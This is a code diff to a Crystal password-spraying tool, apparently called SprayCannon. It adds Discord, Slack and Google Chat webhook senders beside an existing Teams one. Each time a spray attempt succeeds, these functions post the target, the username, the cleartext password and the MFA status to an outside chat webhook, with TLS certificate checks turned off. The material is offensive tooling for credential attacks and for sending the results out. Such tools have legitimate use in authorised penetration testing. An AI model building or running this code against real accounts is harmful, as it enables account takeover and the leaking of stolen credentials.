@@ -370,10 +370,17 @@ class Sprayer
                         insert_db_sprayed(db, item[0],item[1]) unless attempt[3] # add to sprayed unless it was locked
                         insert_db_valid(db, item[0],item[1]) if attempt[2] # ie valid
                     end
+                    
 
 
                     puts "#{attempt[0].as(String)}, #{attempt[1].as(String)},#{" Valid".colorize(:green).to_s if attempt[2]},#{" locked".colorize(:red).to_s if attempt[3]}, #{" mfa".colorize(:yellow).to_s if attempt[4]}"
-                    
+                                        
+                    # if valid and webhook not "" send webhook 
+                    if attempt[2] && @webhook_url != ""
+                        web_hook(attempt[0].as(String), attempt[1].as(String), attempt[4])
+                    end
+
+
                     jitter() unless item[0] == @usernames.last || valid_accounts.includes? item[0] || already_sprayed.includes? "#{item[0]}:#{item[1]}"
                 end
                 return 
@@ -409,6 +416,14 @@ class Sprayer
 
 
                     puts "#{attempt[0].as(String)}, #{attempt[1].as(String)},#{" Valid".colorize(:green).to_s if attempt[2]},#{" locked".colorize(:red).to_s if attempt[3]}, #{" mfa".colorize(:yellow).to_s if attempt[4]}"
+                    
+                    
+                    # if valid and webhook not "" send webhook 
+                    if attempt[2] && @webhook_url != ""
+                        web_hook(attempt[0].as(String), attempt[1].as(String), attempt[4])
+                    end
+                    
+                    
                     jitter() unless uname == usernames.last
                 end
                 return 
@@ -450,6 +465,7 @@ class Sprayer
 
                     # puts "#{uname}, #{pass}, #{(attempt[2]) ? "valid" : "invalid".colorize(:red).to_s }, #{ (attempt[3]) ? "locked".colorize(:red).to_s : "notlocked"  }"
                     puts "#{attempt[0].as(String)}, #{attempt[1].as(String)},#{" valid".colorize(:green).to_s if attempt[2]},#{" locked".colorize(:red).to_s if attempt[3]}, #{" mfa".colorize(:yellow).to_s if attempt[4]}"
+                    
                     # if valid and webhook not "" send webhook 
                     if attempt[2] && @webhook_url != ""
                         web_hook(attempt[0].as(String), attempt[1].as(String), attempt[4])
@@ -664,8 +680,73 @@ class Sprayer
     end
 
 
+    # wrapper for each individual webhook 
+    protected def web_hook( username, password, mfa )
+        STDERR.puts "Sending webhook"
+
+        if @webhook_url.includes? "webhook.office.com"
+            teams_web_hook(username, password, mfa) 
+        elsif @webhook_url.includes? "discord.com"
+            discord_web_hook(username, password, mfa)
+        elsif @webhook_url.includes? "hooks.slack.com"
+            slack_web_hook(username, password, mfa)
+        elsif @webhook_url.includes? "chat.googleapis.com"
+            googlechat_web_hook(username, password , mfa )
+        end
+    end
+
+
+
+    protected def discord_web_hook(username, password, mfa )
+        # STDERR.puts "Sending webhook to Discord! "
+        mfa_str = "No"
+        mfa_str = "Yes" if mfa
+        card = %(
+            {
+                "content": null,
+                "embeds": [
+                    {
+                    "title": "Valid Password Found!",
+                    "description": "Target: #{@target}",
+                    "color": 65328,
+                    "fields": [
+                        {
+                        "name": "__Username__",
+                        "value": "`#{username}`",
+                        "inline": true
+                        },
+                        {
+                        "name": "__Password__",
+                        "value": "`#{password}`",
+                        "inline": true
+                        },
+                        {
+                        "name": "__MFA Status__",
+                        "value": "`#{mfa_str}`",
+                        "inline": true
+                        }
+                    ]
+                    }
+                ],
+                "username": "SprayCannon"
+                }
+        )
+        # added this so if going through burp you will be fine 
+        context = OpenSSL::SSL::Context::Client.new
+        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
+        begin 
+            answer = HTTP::Client.post( URI.parse( @webhook_url ), headers: HTTP::Headers{"Content-Type" => "application/json"} , body: card, tls: context )
+            if answer.status_code != 204
+                STDERR.puts "Web Hook BROKE!!!!!!!!!! | CHECK SPDB".colorize(:red)
+            end
+        rescue 
+            STDERR.puts "Webhook failed to execute... :( | CHECK SPDB!!!"
+        end
+    end
+
+
     # teams webhook. more can be implemented if necessary 
-    protected def web_hook(username, password, mfa)
+    protected def teams_web_hook(username, password, mfa)
         mfa_str = "No"
         mfa_str = "Yes" if mfa
         card = "
@@ -677,6 +758,9 @@ class Sprayer
             \"sections\": [{
                 \"activityTitle\": \"Valid Password Found!!!!!\",
                 \"facts\": [{
+                    \"name\": \"Target: \",
+                    \"value\": \"#{@target}\"
+                }, {
                     \"name\": \"User: \",
                     \"value\": \"#{username}\"
                 }, {
@@ -697,14 +781,112 @@ class Sprayer
         begin 
             answer = HTTP::Client.post( URI.parse( @webhook_url ) , body: card, tls: context )
             if answer.body.to_i  != 1 
-                STDERR.puts "Web Hook Is BROKEN!!!!!!!!!!".colorize(:red)
+                STDERR.puts "Web Hook BROKE!!!!!!!!!! | CHECK SPDB".colorize(:red)
             end
         rescue 
             STDERR.puts "Webhook failed to execute... :( | CHECK SPDB!!!"
         end
-        
-       
-
     end
 
+
+    protected def slack_web_hook(username, password , mfa)
+        mfa_str = "No"
+        mfa_str = "Yes" if mfa
+        card = %(
+            {
+                "blocks": [
+                    {
+                        "type": "header",
+                        "text": {
+                            "type": "plain_text",
+                            "text": "Valid Password Found!",
+                            "emoji": true
+                        }
+                    },
+                    {
+                        "type": "context",
+                        "elements": [
+                            {
+                                "type": "mrkdwn",
+                                "text": "*Target:* #{@target}"
+                            }
+                        ]
+                    },
+                    {
+                        "type": "section",
+                        "fields": [
+                            {
+                                "type": "mrkdwn",
+                                "text": "*UserName:* #{username}"
+                            },
+                            {
+                                "type": "mrkdwn",
+                                "text": "\n*Password:* #{password}"
+                            },
+                            {
+                                "type": "mrkdwn",
+                                "text": "*MFA Status:* #{mfa_str}"
+                            }
+                        ]
+                    },
+                    {
+                        "type": "divider"
+                    }
+                ]
+            }
+        )
+
+        # added this so if going through burp you will be fine 
+        context = OpenSSL::SSL::Context::Client.new
+        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
+        begin 
+            answer = HTTP::Client.post( URI.parse( @webhook_url ) , body: card, tls: context )
+            if answer.status_code != 200
+                STDERR.puts "Web Hook BROKE!!!!!!!!!! | CHECK SPDB".colorize(:red)
+            end
+        rescue 
+            STDERR.puts "Webhook failed to execute... :( | CHECK SPDB!!!"
+        end
+    end
+
+
+    protected def googlechat_web_hook(username, password , mfa)
+        mfa_str = "No"
+        mfa_str = "Yes" if mfa
+        card = %(
+            {
+                "cards": [
+                    {
+                        "header":{
+                            "title":"Valid Password Found!",
+                            "subtitle": "#{@target}"
+                        },
+                        "sections": [
+                        {
+                            "widgets": [
+                            {
+                                "textParagraph": {
+                                "text": "<b><u>Username:</u></b> #{username}<br><b><u>Password:</u></b> #{password}<br><b><u>MFA Status:</u></b> #{mfa_str}"
+                                }
+                            }
+                            ]
+                        }
+                        ]
+                    }
+                ]
+            }
+        )
+
+        # added this so if going through burp you will be fine 
+        context = OpenSSL::SSL::Context::Client.new
+        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
+        begin 
+            answer = HTTP::Client.post( URI.parse( @webhook_url ) , body: card, tls: context )
+            if answer.status_code != 200
+                STDERR.puts "Web Hook BROKE!!!!!!!!!! | CHECK SPDB".colorize(:red)
+            end
+        rescue 
+            STDERR.puts "Webhook failed to execute... :( | CHECK SPDB!!!"
+        end
+    end
 end
